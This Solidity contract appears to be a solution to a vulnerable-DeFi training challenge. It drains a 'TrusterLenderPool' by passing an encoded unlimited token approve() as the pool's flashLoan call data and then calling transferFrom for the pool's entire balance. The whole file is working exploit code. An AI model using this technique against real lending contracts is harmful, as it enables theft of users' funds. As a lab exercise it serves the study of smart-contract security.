// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../truster/TrusterLenderPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract AttackTruster {

    TrusterLenderPool trustPool;
    IERC20 public immutable dvtToken;

    constructor(address _dvtAddy, address _poolAddy) {
        trustPool = TrusterLenderPool(_poolAddy);
        dvtToken = IERC20(_dvtAddy);
    }

    function attack () external {
        // Encode the approve() function of DVT contract with our
        // desired parameters and store it as "data", to pass this as
        // parameter in pool's flashLoan() function call.
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            2**256 - 1
        );

        // Execute flashLoan() function on the pool contract.
        // This does an approval from the pool to this contract.
        trustPool.flashLoan(0, msg.sender, address(dvtToken), data);

        // Transfer all tokens from pool to attacker
        dvtToken.transferFrom(address(trustPool), msg.sender, dvtToken.balanceOf(address(trustPool)));
    }
}